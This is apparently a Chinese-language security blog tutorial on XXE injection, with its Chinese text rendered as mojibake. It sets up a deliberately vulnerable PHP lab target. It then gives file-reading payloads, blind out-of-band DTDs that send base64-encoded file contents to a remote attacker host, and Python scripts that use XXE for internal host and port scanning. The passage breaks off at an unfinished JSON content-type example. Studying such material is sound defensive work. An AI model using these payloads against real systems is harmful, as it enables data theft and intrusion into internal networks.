<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">  $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">  $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">  $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">  $creds = simplexml_import_dom($dom);   <span class="keyword">echo</span> $creds;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>åœ¨Cç›˜ä¸‹æ–°å»ºä¸€ä¸ªflag.txtï¼Œå†…å®¹æˆ‘è®¾ç½®æˆäº†<code>XXE Payload Executed Successfully!!!</code>ã€‚</p>
<p>æœ¬åœ°ä¸»æœºï¼špayload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/flag.txt&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200130112525.png" alt=""></p>
<p>å¦‚æœflag.txtä¸­åŒ…å«ç‰¹æ®Šç¬¦å·ï¼Œæ¯”å¦‚<code>&lt;&gt;&amp;&quot;'</code>ç­‰ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;XXE Payload Executed Successfully!!!&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200130113316.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°å½“è¢«è¯»å–æ–‡ä»¶ä¸­å«æœ‰ç‰¹æ®Šç¬¦å·æ—¶ï¼Œè¿”å›äº†ä¸€å †é”™è¯¯ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦ä½¿ç”¨CDATAäº†ã€‚ï¼ˆå½“ç„¶ï¼Œæ›´ç®€å•çš„ä½¿ç”¨base64ç¼–ç ï¼‰</p>
<blockquote>
<p>ä»€ä¹ˆæ˜¯CDATAï¼š</p>
<p>CDATAï¼Œæ„ä¸ºcharacter dataï¼Œæ˜¯æ ‡è®°è¯­è¨€SGMLä¸XMLï¼Œè¡¨ç¤ºæ–‡æ¡£çš„ç‰¹å®šéƒ¨åˆ†æ˜¯æ™®é€šçš„å­—ç¬¦æ•°æ®ï¼Œè€Œä¸æ˜¯éå­—ç¬¦æ•°æ®æˆ–æœ‰ç‰¹å®šã€é™å®šç»“æ„çš„å­—ç¬¦æ•°æ®ã€‚åœ¨XMLæ–‡æ¡£æˆ–å¤–éƒ¨å®ä½“ä¸­ï¼Œä¸€ä¸ªCDATA sectionæ˜¯ä¸€æ®µæŒ‰å­—é¢è§£é‡Šçš„å†…å®¹ï¼Œä¸ä½œä¸ºæ ‡è®°æ–‡æœ¬ã€‚å­—ç¬¦ç”¨CDATAèŠ‚è¡¨ç¤ºæˆ–è€…æŒ‰ç…§æ ‡å‡†è¯­æ³•è¡¨ç¤ºï¼Œå¹¶æ— å·®å¼‚ã€‚</p>
<p>CDATA éƒ¨åˆ†ç”±<code>&quot;&lt;![CDATA[&quot;</code>å¼€å§‹ï¼Œç”±<code>&quot;]]&gt;&quot;</code>ç»“æŸ</p>
</blockquote>
<p>ç®€å•ä¸€ç‚¹çš„æ¥è¯´ï¼Œå°†è„šæœ¬ä»£ç å®šä¹‰ä¸ºCDATAåï¼ŒCDATAéƒ¨åˆ†ä¸­çš„å†…å®¹å°±ä¼šè¢«è§£æå™¨å¿½ç•¥ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥è¯»å–æ–‡ä»¶äº†ã€‚</p>
<p>æœ¬åœ°ä¸»æœºï¼šCDATA Payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.109&#x2F;evil.dtd&quot;&gt; %dtd;]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt;</span><br></pre></td></tr></table></figure>
<p>æœ¬åœ°ä¸»æœºï¼ševil.dtd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200130142215.png" alt=""></p>
<p>åˆ©ç”¨å¸¦æœ‰CDATAçš„Payloadï¼Œå¯ä»¥çœ‹åˆ°ç‰¹æ®Šç¬¦å·è¢«æˆåŠŸç»•è¿‡ã€‚</p>
<p>ä½†æ˜¯åœ¨çœŸå®æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¸Šçš„XMLä¸€èˆ¬ç”¨äºé…ç½®æ–‡ä»¶æˆ–è€…ä¼ è¾“æ•°æ®ï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºæ•°æ®ï¼Œå› æ­¤åœ¨ç°å®ç¯å¢ƒä¸‹åˆ©ç”¨è¿™ä¸ªæ¼æ´å°±éœ€è¦æ‰¾åˆ°ä¸ä¾é å›æ˜¾çš„æ–¹æ³•ã€‚</p>
<h3 id="æ— å›æ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶ï¼ˆBlind-XEEï¼‰">æ— å›æ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶ï¼ˆBlind XEEï¼‰</h3>
<h4 id="payload1">payload1</h4>
<p>ç›®æ ‡é¶æœºï¼šxxe_blind_test.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">  $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">  $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">  $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æœ¬åœ°ä¸»æœºï¼šPayload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.109&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p>æœ¬åœ°ä¸»æœºï¼ševil.dtd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;47.97.199.89:9999?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200201185338.png" alt=""></p>
<p>çœ‹åˆ°æœåŠ¡å™¨ç«¯æ¥æ”¶åˆ°äº†æˆ‘ä»¬ç”¨ base64 ç¼–ç åçš„æ•æ„Ÿæ–‡ä»¶ä¿¡æ¯(ç¼–ç ä¹Ÿæ˜¯ä¸ºäº†ä¸ç ´ååŸæœ¬çš„XMLè¯­æ³•ï¼Œä¸ç¼–ç ä¼šæŠ¥é”™ï¼‰ã€‚</p>
<blockquote>
<p>ç›®æ ‡é¶æœºçš„ç½‘ç»œå‡ºäº†ç‚¹é—®é¢˜ï¼ŒIPåœ°å€æ¢æˆäº†192.168.50.130</p>
</blockquote>
<p>ç°åœ¨æˆ‘ä»¬å†æ¥å›é¡¾ä¸€ä¸‹Payloadçš„è°ƒç”¨è¿‡ç¨‹ï¼š</p>
<p>è¿ç»­è°ƒç”¨äº†ä¸‰ä¸ªå‚æ•°å®ä½“ <code>%remote;%int;%send;</code>ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬çš„åˆ©ç”¨é¡ºåºï¼Œ%remote å…ˆè°ƒç”¨ï¼Œè°ƒç”¨åè¯·æ±‚è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ evil.dtd ï¼Œæœ‰ç‚¹ç±»ä¼¼äºå°† evil.dtd åŒ…å«è¿›æ¥ï¼Œç„¶å %int è°ƒç”¨ evil.dtd ä¸­çš„ %file, %file å°±ä¼šå»è·å–æœåŠ¡å™¨ä¸Šé¢çš„æ•æ„Ÿæ–‡ä»¶ï¼Œç„¶åå°† %file çš„ç»“æœå¡«å…¥åˆ° %send ä»¥å(å› ä¸ºå®ä½“çš„å€¼ä¸­ä¸èƒ½æœ‰ %, æ‰€ä»¥å°†å…¶è½¬æˆhtmlå®ä½“ç¼–ç  <code>&amp;#37;</code>)ï¼Œæˆ‘ä»¬å†è°ƒç”¨ %send; æŠŠæˆ‘ä»¬çš„è¯»å–åˆ°çš„æ•°æ®å‘é€åˆ°æˆ‘ä»¬çš„è¿œç¨‹æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·å°±å®ç°äº†å¤–å¸¦æ•°æ®çš„æ•ˆæœï¼Œè§£å†³äº† XXE æ— å›æ˜¾çš„é—®é¢˜ã€‚</p>
<h4 id="payload2">payload2</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;TEST.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;yourvps&#x2F;xxe.xml&quot;&gt;</span><br><span class="line">%dtd; %all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;value&gt;&amp;send;&lt;&#x2F;value&gt;</span><br></pre></td></tr></table></figure>
<p>åœ¨æˆ‘çš„vpsçš„xxe.xmlçš„å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;yourvps&#x2F;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>è€Œæµ‹è¯•æ–‡ä»¶TEST.txtå†…å®¹ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chybeta</span><br></pre></td></tr></table></figure>
<p>æ•´ä¸ªçš„è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼šè§£ææ—¶<code>%dtd</code>å¼•å…¥xxe.xmlï¼Œä¹‹å<code>%all</code>å¼•å…¥<code>send</code>çš„å®šä¹‰ï¼Œæœ€åå¼•ç”¨äº†å®ä½“sendï¼ŒæŠŠ<code>%file</code>æ–‡ä»¶å†…å®¹é€šè¿‡ä¸€ä¸ªhttpè¯·æ±‚å‘äº†å‡ºå»ã€‚æ³¨æ„éœ€è¦æŠŠpayloadç»è¿‡urlç¼–ç ã€‚æŸ¥çœ‹vpsä¸Šçš„access.logï¼š</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/4.jpg?raw=true" alt="img"></p>
<p>è‹¥è¦è¯»å–phpç­‰æ–‡ä»¶ï¼ŒåŒæ ·éœ€è¦å…ˆç»è¿‡base64åŠ å¯†ä¸‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;yourvps&#x2F;xxe.xml&quot;&gt;</span><br><span class="line">%dtd; %all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;value&gt;&amp;send;&lt;&#x2F;value&gt;</span><br></pre></td></tr></table></figure>
<h3 id="æ€è€ƒ">æ€è€ƒ</h3>
<p>æˆ‘ä»¬åˆšåˆšéƒ½åªæ˜¯åšäº†ä¸€ä»¶äº‹ï¼Œé‚£å°±æ˜¯é€šè¿‡ file åè®®è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œæˆ–è€…æ˜¯é€šè¿‡ http åè®®å‘å‡ºè¯·æ±‚ï¼Œç†Ÿæ‚‰ SSRF çš„ç«¥é‹åº”è¯¥å¾ˆå¿«ååº”è¿‡æ¥ï¼Œè¿™å…¶å®éå¸¸ç±»ä¼¼äº SSRF ï¼Œå› ä¸ºä»–ä»¬éƒ½èƒ½ä»æœåŠ¡å™¨å‘å¦ä¸€å°æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚æœå°†è¿œç¨‹æœåŠ¡å™¨çš„åœ°å€æ¢æˆæŸä¸ªå†…ç½‘çš„åœ°å€ï¼Œï¼ˆæ¯”å¦‚ 192.168.0.10:8080ï¼‰æ˜¯ä¸æ˜¯ä¹Ÿèƒ½å®ç° SSRF åŒæ ·çš„æ•ˆæœå‘¢ï¼Ÿæ²¡é”™ï¼ŒXXE å…¶å®ä¹Ÿæ˜¯ä¸€ç§ SSRF çš„æ”»å‡»æ‰‹æ³•ï¼Œå› ä¸º SSRF å…¶å®åªæ˜¯ä¸€ç§æ”»å‡»æ¨¡å¼ï¼Œåˆ©ç”¨è¿™ç§æ”»å‡»æ¨¡å¼æˆ‘ä»¬èƒ½ä½¿ç”¨å¾ˆå¤šçš„åè®®ä»¥åŠæ¼æ´è¿›è¡Œæ”»å‡»ã€‚</p>
<p>æ‰€ä»¥è¦æƒ³æ›´è¿›ä¸€æ­¥çš„åˆ©ç”¨æˆ‘ä»¬ä¸èƒ½å°†çœ¼å…‰å±€é™äº file åè®®ï¼Œæˆ‘ä»¬å¿…é¡»æ¸…æ¥šåœ°çŸ¥é“åœ¨ä½•ç§å¹³å°ï¼Œæˆ‘ä»¬èƒ½ç”¨ä½•ç§åè®®ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200201214217.png" alt=""></p>
<h3 id="HTTPå†…ç½‘æ¢æµ‹ä¸»æœº">HTTPå†…ç½‘æ¢æµ‹ä¸»æœº</h3>
<p><a href="http://xn--inhostscan-5i2pu68rs6giudtu5ago6eof2d.py">ä¸‹é¢æ˜¯æ¢æµ‹è„šæœ¬inhostscan.py</a>ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">XXE</span>(<span class="params">ip,string</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        xml = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span></span><br><span class="line">        xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span></span><br><span class="line">        xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="string">&#x27;&quot;&#x27;</span> + string + <span class="string">&#x27;&quot;&#x27;</span> + <span class="string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span></span><br><span class="line">        xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span></span><br><span class="line">        xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span></span><br><span class="line">        xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span></span><br><span class="line">        x = requests.post(<span class="string">&#x27;http://192.168.50.132/xxe_blind_test.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="number">5</span>).text</span><br><span class="line">        coded_string = x.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">-2</span>]</span><br><span class="line">        print(<span class="string">&#x27; [+]&#x27;</span>,ip,<span class="string">&#x27;Successfully Found !!!&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&#x27; [-]&#x27;</span>,ip,<span class="string">&#x27;Error Not Found !!!&#x27;</span>)  </span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/xml&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">        ip = <span class="string">&#x27;192.168.50.&#x27;</span> + str(i)</span><br><span class="line">        string = <span class="string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        XXE(ip,string)</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„æ›¿æ¢ä¸€ä¸‹IPåœ°å€çš„ç½‘æ®µã€‚è¿™ä¸ªè„šæœ¬è·‘çš„ç¡®å®å¾ˆæ…¢ï¼Œç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] 192.168.50.1 Successfully Found !!!</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">[-] 192.168.50.130 Error Not Found !!!</span><br><span class="line">[-] 192.168.50.131 Error Not Found !!!</span><br><span class="line">[+] 192.168.50.132 Successfully Found !!!</span><br><span class="line">[+] 192.168.50.133 Successfully Found !!!</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="HTTPå†…ç½‘ä¸»æœºæ¢æµ‹ç«¯å£">HTTPå†…ç½‘ä¸»æœºæ¢æµ‹ç«¯å£</h3>
<p>æ‰¾åˆ°äº†å†…ç½‘çš„ä¸»æœºï¼Œè¿˜éœ€è¦å¯¹å…¶ç«¯å£è¿›è¡Œæ‰«æï¼ŒåŸç†å’Œä¸Šé¢ä¸€è‡´ï¼Œåªä¸è¿‡IPå›ºå®šï¼Œéå†ç«¯å£ï¼Œæˆ‘ä»¬å…ˆç”¨Burp Suiteçœ‹ä¸€ä¸‹ç«¯å£å¼€æ”¾å’Œå…³é—­çš„responseæœ‰ä»€ä¹ˆä¸åŒï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200206110812.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200206110852.png" alt=""></p>
<p>å¦‚æœç«¯å£æ˜¯å…³é—­çš„ï¼Œä¸€èˆ¬éƒ½ä¼šè¿”å›Connection refuseã€‚</p>
<p>ä¸‹é¢æ”¾å‡ºPayloadã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">XXE</span>(<span class="params">port</span>):</span></span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE data SYSTEM &quot;http://192.168.50.132:&quot;&quot;&quot;</span> + str(port) + <span class="string">&quot;&quot;&quot;/&quot; [&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!ELEMENT data (#PCDATA)&gt; &quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;]&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;data&gt;7&lt;/data&gt;&quot;&quot;&quot;</span></span><br><span class="line">    r = requests.post(<span class="string">&#x27;http://192.168.50.132/xxe_blind_test.php&#x27;</span>, data=xml,timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="comment">#print(port,r.elapsed.total_seconds())</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;Connection refused&quot;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">        print(<span class="string">&quot; [-]&quot;</span>, port, <span class="string">&quot; seems shut down&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot; [+]&quot;</span>, port, <span class="string">&quot;is up&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9080</span>,<span class="number">9082</span>):</span><br><span class="line">        XXE(i)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ç¬”è€…æµ‹è¯•å‘ç°ä¸åŒçš„ç¯å¢ƒï¼Œç»“æœå¯èƒ½ä¼šä¸ä¸€æ ·ï¼Œå› æ­¤å¯èƒ½éœ€è¦ä¸åŒçš„payloadè¿›è¡Œç«¯å£æ‰«æï¼Œè¿™ä¸ªéœ€è¦å…·ä½“ç»“åˆä»£ç å’Œæµ‹è¯•ç»“æœæ¥æ•²å®šä¸€ä¸ªæœ‰æ•ˆçš„payloadã€‚</p>
</blockquote>
<h2 id="å¦‚ä½•æŒ–æ˜XXEæ¼æ´">å¦‚ä½•æŒ–æ˜XXEæ¼æ´</h2>
<h3 id="å¸¸ç”¨æ£€æµ‹æ–¹æ³•">å¸¸ç”¨æ£€æµ‹æ–¹æ³•</h3>
<h4 id="é¦–å…ˆæŸ¥çœ‹XMLæ˜¯å¦å¯ä»¥æˆåŠŸè§£æ">é¦–å…ˆæŸ¥çœ‹XMLæ˜¯å¦å¯ä»¥æˆåŠŸè§£æ</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE ANY [  </span><br><span class="line">&lt;!ENTITY name &quot;test1&quot;&gt;]&gt;    </span><br><span class="line">&lt;root&gt;&amp;name;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœé¡µé¢è¾“å‡ºäº†test1ï¼Œåˆ™å¯ä»¥è§£æXMLã€‚</p>
<p>ç¬¬äºŒæ­¥æŸ¥çœ‹æ˜¯å¦æ”¯æŒDTDå¼•ç”¨å¤–éƒ¨å®ä½“ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;â€1.0â€ encoding&#x3D;â€UTF-8â€?&gt;  </span><br><span class="line">&lt;!DOCTYPE ANY [  </span><br><span class="line">&lt;!ENTITY % name SYSTEM &quot;http:&#x2F;&#x2F;myhost&#x2F;index.html&quot;&gt;  </span><br><span class="line">%name;  </span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p>ç„¶ååœ¨æˆ‘çš„æœåŠ¡å™¨ä¸ŠæŸ¥çœ‹æ—¥å¿—,å¦‚æœæœ‰ç›®æ ‡æœåŠ¡å™¨å‘æˆ‘çš„æœåŠ¡å™¨å‘é€äº†ä¸€æ¡index.htmlçš„è¯·æ±‚,è¯´æ˜<br>
æ”¯æŒå¼•ç”¨å¤–éƒ¨å®ä½“,å¾ˆæœ‰å¯èƒ½å­˜åœ¨xxeæ¼æ´ã€‚</p>
<h4 id="å¤–éƒ¨æ™®é€šå®ä½“">å¤–éƒ¨æ™®é€šå®ä½“</h4>
<p>å½“æœ‰å›æ˜¾æ—¶ï¼Œåˆ©ç”¨file://åè®®:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE lltest[</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;Windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>
<h4 id="å¤–éƒ¨å‚æ•°å®ä½“">å¤–éƒ¨å‚æ•°å®ä½“</h4>
<p>å½“æ— å›æ˜¾ï¼Œä½¿ç”¨httpåè®®:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note[ </span><br><span class="line">&lt;!ENTITY % lltest SYSTEM &quot;http:&#x2F;&#x2F;myhost:1234&#x2F;test_xxe&quot;&gt;</span><br><span class="line">%lltest;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p>ç„¶ååœ¨myhostç›‘å¬1234ç«¯å£(dnslogåœ°å€ä¹Ÿå¯ä»¥),æŸ¥çœ‹æ˜¯å¦æœ‰httpè¯·æ±‚ã€‚</p>
<h3 id="Json-Content-type-XXE">Json Content-type XXE</h3>
<p>å¾ˆå¤šWebä¸Appåº”ç”¨éƒ½æ˜¯åŸºäºå®¢æˆ·ç«¯-æœåŠ¡å™¨äº¤äº’çš„Webé€šä¿¡æœåŠ¡,æœ€å¸¸è§çš„æ•°æ®æ ¼å¼å°±æ˜¯Jsonä¸XMLï¼Œå°½ç®¡webæœåŠ¡å¯èƒ½åªä½¿ç”¨ä¸€ç§æ ¼å¼ï¼Œä½†æ˜¯æœåŠ¡å™¨å´å¯ä»¥æ¥æ”¶å¼€å‘äººå‘˜æ²¡æœ‰æ–™åˆ°çš„å…¶ä»–æ•°æ®æ ¼å¼ï¼Œæœ‰å¯èƒ½å¯¼è‡´JsonèŠ‚ç‚¹å—åˆ°XXEæ”»å‡»ã€‚<br>
æµ‹è¯•æ–¹æ³•å¾ˆç®€å•,å°±æ˜¯å°†<code>Content-Type: application/json</code>ä¿®æ”¹ä¸º<code>Content-Type: application/xml</code>ï¼Œæ•°æ®æ ¼å¼ä¸å˜ï¼ŒæŸ¥çœ‹æ˜¯å¦æŠ¥é”™:<br>
<code>&#123;&quot;errors&quot;:&#123;&quot;errorMessage&quot;:&quot;org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.&quot;&#125;&#125;</code><br>
å¯ä»¥å‘ç°æœåŠ¡å™¨æ˜¯å¯ä»¥å¤„ç†xmlæ•°æ®çš„ï¼Œäºæ˜¯æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªæ¥è¿›è¡Œæ”»å‡»ã€‚<br>
payload:</p>
